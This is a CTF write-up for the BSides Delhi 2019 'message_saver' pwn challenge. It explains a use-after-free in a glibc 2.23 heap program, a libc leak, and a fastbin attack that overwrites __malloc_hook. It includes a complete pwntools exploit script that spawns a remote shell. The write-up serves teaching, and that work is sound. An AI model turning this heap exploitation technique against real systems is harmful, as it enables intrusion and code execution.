---
layout: post
title:  "BSides Delhi 2019: message_saver"
date:   2019-09-30 00:12:30 +0800
categories: pwn
tags: BSides-Delhi-2019
---

This is a glibc 2.23 heap exploitation challenge. There is a UAF (use-after-free) vulnerability in the program. When chunks are freed, their corresponding pointers in the global array of chunks is not NULL'd out.

I initially use the unsorted bin to leak the libc address of the unsorted bin in the main arena. I use this address to find the base address of libc, followed by the address of `__malloc_hook` as well as the address of my one gadget. After that, it's essentially just a fastbin attack to get a chunk on top of `__malloc_hook` and overwrite it with the one gadget's address.

Honestly, the UAF makes this challenge extremely easy. I'm surprised more people didn't solve it.

### **Challenge**

* **Category:** pwn
* **Points:** 957
* **Solves:** 12

>Discription: Here comes a new and improved free message saving service.
>
>nc 35.226.111.216 4444
>
>Author: [3agl31](https://twitter.com/3agl31)
>
>Link: [message_saver](https://drive.google.com/file/d/1jXDymZ5PYoVzbJZUk02MQJXIuc1d7pQm/view?usp=sharing)

### **Solution**

#### Reverse engineering the binary

The binary has the following characteristics:
```sh
vagrant@ubuntu-bionic:/ctf/pwn-and-rev/bsides_delhi2019/message_saver$ file message_saver
message_saver: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, BuildID[sha1]=008f02f75788e02e0e6087e395b30d99a624dda1, for GNU/Linux 3.2.0, not stripped

vagrant@ubuntu-bionic:/ctf/pwn-and-rev/bsides_delhi2019/message_saver$ checksec message_saver
[*] '/ctf/pwn-and-rev/bsides_delhi2019/message_saver/message_saver'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

It's a non-stripped x64 binary with all protections enabled. The fact that it is non-stripped makes it very easy to disassemble it. It poses as a "message saving service", where messages are stored in a global array of pointers. There is a limit of 9 messages imposed on the program. The functionality is as follows.

The `add` function will first call `malloc(0x28)` to allocate a chunk to store the topic of the message. The first 24 bytes of this chunk stores the topic of the message.The next 8 bytes will store the address of the body of the message. The next 8 bytes will store the size of the body of the message. The body is a chunk that is malloc'd by the user, and it must be between 0x0 and 0x3e8 bytes (inclusive) in size.

An allocated message looks like the following:
```c
gef➤  x/100gx 0x0000555555559000
0x555555559000: 0x0000000000000000      0x0000000000000031 <- topic chunk
0x555555559010: 0x4141414141414141      0x0000000000000000
0x555555559020: 0x0000000000000000      0x0000555555559040 <- pointer to body
0x555555559030: 0x0000000000000032      0x0000000000000041 <- 0x32 is the size of the body
0x555555559040: 0x4242424242424242      0x4242424242424242 <- text of the body
0x555555559050: 0x4242424242424242      0x4242424242424242
0x555555559060: 0x4242424242424242      0x0042424242424242
0x555555559070: 0x0000000000000000      0x0000000000020f91 <- top chunk
0x555555559080: 0x0000000000000000      0x0000000000000000
```

The `edit` function will just edit a message's topic and body. No heap overflows or anything here, so it's a pretty uninteresting function.

The `delete` function will free a message's topic and body, but it will not `NULL` out the message's pointer that is stored in the global `messages` array. This creates a UAF situation which we will use in the exploit.

The `view` function simply prints out a message's topic followed by its body.

#### Step 1: **Unsorted bin leak**

An info leak is extremely easy in glibc 2.23 (due to the absence of the tcache) with a UAF vulnerability. All we have to do is free a small sized chunk and read its FD pointer.

I initially start out by setting up 4 chunks (note that the topic does not matter, you can set it to anything):
1. **Chunk A (size 0x80 bytes)** will be our small sized chunk. It will be used to leak the libc address of the unsorted bin in the main arena.
2. **Chunk B (size 0x68 bytes)** will be used for the fastbin attack. It must be this size to bypass a check that is described below.
3. **Chunk C (size 0x68 bytes)** will be used for the fastbin attack. It must be this size to bypass a check that is described below.
4. **Chunk D (size 0x50 bytes)** is not used. It is only there to prevent the previous chunks from coalescing with the top chunk when freed.

After that, I simply free chunk A. Since it is a small sized chunk, a libc pointer is placed in it's `fd` and `bk` fields, as shown below:
```c
gef➤  x/100gx 0x0000560b07fb2000
0x560b07fb2000: 0x0000000000000000      0x0000000000000031 <- chunk A topic
0x560b07fb2010: 0x0000000000000000      0x0000000000000000 <- topic is fastbin sized, so FD is empty after free
0x560b07fb2020: 0x0000000000000000      0x0000560b07fb2040 <- pointer to body
0x560b07fb2030: 0x0000000000000082      0x0000000000000091 <- chunk A body
0x560b07fb2040: 0x00007f150ec23b78      0x00007f150ec23b78 <- FD and BK have libc pointers in them
0x560b07fb2050: 0x4141414141414141      0x4141414141414141 <- rest of chunk A body
0x560b07fb2060: 0x4141414141414141      0x4141414141414141
...
```

Since we have a UAF, we can get the leak as follows:
```python
leak = u64(show(0).split('\n')[1].split(' : ')[1].ljust(8, '\x00'))
```

#### Step 2: **Fast bin attack**

Now that we have a leak, we need to get a chunk on top of `__malloc_hook` so we can overwrite it with a one gadget. We will do this by doing what is known as a fastbin attack.

When fastbin sized chunks are freed, they get stored in a singly stored linked list known as a fastbin. The way each free chunk keeps track of itself in the list (in a 64-bit system) is by setting aside the first 8 bytes of the chunk for what is called the `fd` pointer, which is essentially a pointer to the next free chunk in this linked list. This is demonstrated below using chunks B and C from our exploit. Note that chunk B was freed first, followed by chunk C:
```c
gef➤  x/300gx 0x00005564e50e9000
0x5564e50e9000: 0x0000000000000000      0x0000000000000031 <- chunk A topic (free)
0x5564e50e9010: 0x0000000000000000      0x0000000000000000 <- chunk A fd is empty as it is the first free chunk
0x5564e50e9020: 0x0000000000000000      0x00005564e50e9040 <- pointer to chunk A body
0x5564e50e9030: 0x0000000000000082      0x0000000000000091 <- chunk A body (free) in the unsorted bin
0x5564e50e9040: 0x00007f998eadfb78      0x00007f998eadfb78 <- libc pointers
0x5564e50e9050: 0x4141414141414141      0x4141414141414141
...
0x5564e50e90c0: 0x0000000000000090      0x0000000000000030 <- chunk B topic (free)
0x5564e50e90d0: 0x00005564e50e9000      0x0000000000000000 <- chunk B fd points to chunk A topic
0x5564e50e90e0: 0x0000000000000000      0x00005564e50e9100 <- pointer to chunk B body
0x5564e50e90f0: 0x0000000000000068      0x0000000000000071 <- chunk B body
0x5564e50e9100: 0x0000000000000000      0x4242424242424242 <- chunk B body fd is empty as it is the first free chunk in the 0x68 fastbin
0x5564e50e9110: 0x4242424242424242      0x4242424242424242
...
0x5564e50e9160: 0x0000424242424242      0x0000000000000031 <- chunk C topic (free)
0x5564e50e9170: 0x00005564e50e90c0      0x0000000000000000 <- chunk C fd points to chunk B topic
0x5564e50e9180: 0x0000000000000000      0x00005564e50e91a0 <- pointer to chunk C body
0x5564e50e9190: 0x0000000000000068      0x0000000000000071 <- chunk C body
0x5564e50e91a0: 0x00005564e50e90f0      0x4343434343434343 <- chunk C body fd points to chunk B body in the 0x68 fastbin
0x5564e50e91b0: 0x4343434343434343      0x4343434343434343
...
0x5564e50e9200: 0x0000434343434343      0x0000000000000031 <- chunk D topic (to prevent coalescing with the top chunk)
0x5564e50e9210: 0x4444444444444444      0x0000000000000000
```

Now, what happens if we allocate space for a new message where the body size of the message is 0x68 bytes?

1. We will get chunk C given back to us from the 0x68 fastbin
2. The pointer in the `fd` of chunk C will be placed at the front of that fastbin
3. A subsequent malloc will then give us a chunk wherever that `fd` pointer was pointing to

Knowing this, we can trick malloc. Given that we have a UAF vulnerability, we can overwrite this `fd` pointer with a pointer of our choosing. This pointer can be arbitrary, barring some restrictions, as shown by [this check](https://github.com/mistydemeo/super_nes_classic_edition_oss/blob/master/glibc-2.23/glibc-2.23/malloc/malloc.c#L3383) in `malloc.c`:
```c
if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
{
    errstr = "malloc(): memory corruption (fast)";
errout:
    malloc_printerr (check_action, errstr, chunk2mem (victim), av);
    return NULL;
}
```

Basically, the pointer that we overwrite `fd` with must point to a memory region that is 16 byte aligned and has a size that will fit in this specific fastbin. Otherwise, we will get the `"malloc(): memory corruption (fast)"` error.

To elaborate, the pointer must point to a memory region that looks like this (using chunk C's body as an example), where the chunk size must be between 0x70 - 0x7f:
```c
0x5564e50e9190: 0x0000000000000068      0x0000000000000071 <- chunk C body chunksize
```

If we take a look at `__malloc_hook` in memory, we will see the following:
```c
gef➤  x/20gx 0x7f6c4122aae0
0x7f6c4122aae0 <_IO_wide_data_0+288>:   0x0000000000000000      0x0000000000000000
0x7f6c4122aaf0 <_IO_wide_data_0+304>:   0x00007f6c41229260      0x0000000000000000
0x7f6c4122ab00 <__memalign_hook>:       0x00007f6c40eebe20      0x00007f6c40eeba00
0x7f6c4122ab10 <__malloc_hook>: 0x0000000000000000      0x0000000000000000
0x7f6c4122ab20 <main_arena>:    0x0000000000000000      0x0000000000000000
...
```

We see that there isn't a valid memory region near `__malloc_hook`. However, note that the security check above does not ensure that the memory address is 16 byte aligned, so what happens if we instead view the memory region of `__malloc_hook - 0x30 + 0xd`?
```c
gef➤  x/20gx 0x7f6c4122ab10 - 0x30 + 0xd
0x7f6c4122aaed <_IO_wide_data_0+301>:   0x6c41229260000000      0x000000000000007f <- looks like a valid chunk!
0x7f6c4122aafd: 0x0000000000000000      0x6c40eeba00000000
0x7f6c4122ab0d <__realloc_hook+5>:      0x000000000000007f      0x0000000000000000
0x7f6c4122ab1d: 0x0000000000000000      0x0000000000000000
0x7f6c4122ab2d <main_arena+13>: 0x352e4f3160000000      0x0000000000000056
0x7f6c4122ab3d <main_arena+29>: 0x0000000000000000      0x0000000000000000
...
```

Sure, the addresses are labeled weirdly now, but we can see that this is a valid address (0x7f6c4122aaed) that we can point to!

Using our leak from before, we can now calculate the addresses of the things we need:
```python
leak = u64(show(0).split('\n')[1].split(' : ')[1].ljust(8, '\x00'))

# Calculate offsets
libc.address = leak - 0x3c4b78
malloc_hook = libc.symbols['__malloc_hook'] - 0x30 + 0xd
one_gadget = libc.address + 0xf02a4 # Use david942j's one_gadget tool
```

Now, in order to do the fastbin attack, we just overwrite chunk C's body's `fd` pointer with the address to `__malloc_hook - 0x30 + 0xd`. ***However***, in order to do that, we will be overwriting chunk C's topic's `fd` pointer as well (due to how the `edit` function works). We need to keep this a valid pointer, as otherwise when we allocate a chunk again, an invalid `fd` pointer will crash our program.

Since we have a UAF, we can easily just read the current `fd` pointer that chunk C's topic has, and reuse it when we overwrite chunk C's body's `fd` pointer to `__malloc_hook - 0x30 + 0xd`, as follows:
```python
# We must have a valid pointer at the fd of the topic chunk, otherwise the program will crash
# So we initially read the fd pointer and store it
topic_fd = u64(show(2).split('\n')[0].split(' : ')[1].ljust(8, '\x00'))

# Now overwrite the fd pointer of 2's description to __malloc_hook-0x30+0xd
edit(2, p64(topic_fd), p64(malloc_hook))
```

Now we simply perform two mallocs. The first malloc gives us back chunk C and puts the pointer pointing at `__malloc_hook - 0x30 + 0xd` at the front of the 0x68 fastbin. The second malloc subsequently gives us a chunk right on top of `__malloc_hook - 0x30 + 0xd`. Now we just have to pad our input enough to overwrite `__malloc_hook` with a one gadget, as follows:
```python
# Second allocation will be at __malloc_hook-0x30+0xd
# Overwrite __malloc_hook with one_gadget
add(4, 'E'*0x8, 'E'*0x66)
add(5, 'F'*0x8, 'F'*0x13 + p64(one_gadget) + 'F'*0x4b)
```

And finally, we just need to call `malloc` one more time to get a shell.
```python
# Get shell
p.sendlineafter('>>', '1')
p.sendlineafter('index\n', '0')

p.interactive()
```

### **Final Exploit**

Note that for some reason, the exploit isn't 100% reliable. I can't seem to figure out why, but I had to run it a couple times on the shell server before it gave me a shell. At the end of the day though, it works.

```python
#!/usr/bin/env python2

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

BINARY = './message_saver'
HOST, PORT = '35.226.111.216', 4444

elf = ELF(BINARY)
libc = ELF('./libc-2.23.so')

def get_base_address(proc):
	return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
    script = ""
    PIE = get_base_address(p)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    gdb.attach(p,gdbscript=script)

def add(idx, topic, body):
    p.sendlineafter('>>', '1')
    p.sendlineafter('index\n', str(idx))
    p.sendlineafter('topic\n', topic)
    p.sendlineafter('body\n', str(len(body)+2)) # Add two to the size here due to application logic stuff
    p.sendlineafter('body\n', body)

def edit(idx, topic, body):
    p.sendlineafter('>>', '2')
    p.sendlineafter('index\n', str(idx))
    p.sendlineafter('topic\n', topic)
    p.sendlineafter('body\n', body)

def free(idx):
    p.sendlineafter('>>', '3')
    p.sendlineafter('index\n', str(idx))

def show(idx):
    p.sendlineafter('>>', '4')
    p.sendlineafter('index\n', str(idx))

    content = p.recvuntil('Message viewing')

    return content


def start():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

p = start()
if not args.REMOTE and args.GDB:
    debug([])

# Exploit goes here

# Set up initial chunks
add(0, 'A'*0x8, 'A'*0x80) # Small sized chunk, goes into unsorted bin for libc leak
add(1, 'B'*0x8, 'B'*0x66) # Used for fastbin attack
add(2, 'C'*0x8, 'C'*0x66) # Used for fastbin attack
add(3, 'D'*0x8, 'D'*0x50) # Prevents coalesce with the top chunk

# Free the small sized chunk and use the UAF to read the libc address from it
free(0)
leak = u64(show(0).split('\n')[1].split(' : ')[1].ljust(8, '\x00'))

# Calculate offsets
libc.address = leak - 0x3c4b78
malloc_hook = libc.symbols['__malloc_hook'] - 0x30 + 0xd
one_gadget = libc.address + 0xf02a4

log.info('Libc leak: ' + hex(leak))
log.info('Libc base: ' + hex(libc.address))
log.info('__malloc_hook: ' + hex(malloc_hook))
log.info('one_gadget: ' + hex(one_gadget))

# Fastbin attack time. Free 1 and 2
free(1)
free(2)

# We must have a valid pointer at the fd of the topic chunk, otherwise the program will crash
# So we initially read the fd pointer and store it
topic_fd = u64(show(2).split('\n')[0].split(' : ')[1].ljust(8, '\x00'))

# Now overwrite the fd pointer of 2's description to __malloc_hook-0x30+0xd
edit(2, p64(topic_fd), p64(malloc_hook))

# Second allocation will be at __malloc_hook-0x30+0xd
# Overwrite __malloc_hook with one_gadget
add(4, 'E'*0x8, 'E'*0x66)
add(5, 'F'*0x8, 'F'*0x13 + p64(one_gadget) + 'F'*0x4b)

# Get shell
p.sendlineafter('>>', '1')
p.sendlineafter('index\n', '0')

p.interactive()

```
```sh
vagrant@ubuntu-xenial:/ctf/pwn-and-rev/bsides_delhi2019/message_saver$ ./exploit.py REMOTE
[*] '/ctf/pwn-and-rev/bsides_delhi2019/message_saver/message_saver'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/ctf/pwn-and-rev/bsides_delhi2019/message_saver/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 35.226.111.216 on port 4444: Done
[*] Libc leak: 0x7f8fca9d0b78
[*] Libc base: 0x7f8fca60c000
[*] __malloc_hook: 0x7f8fca9d0aed
[*] one_gadget: 0x7f8fca6fc2a4
[*] Switching to interactive mode
$ ls
chall
flag
run.sh
$ cat flag
bsides_delhi{u4f_1s_d4ng3r0us_4ft3r_4ll!!}
$  
```
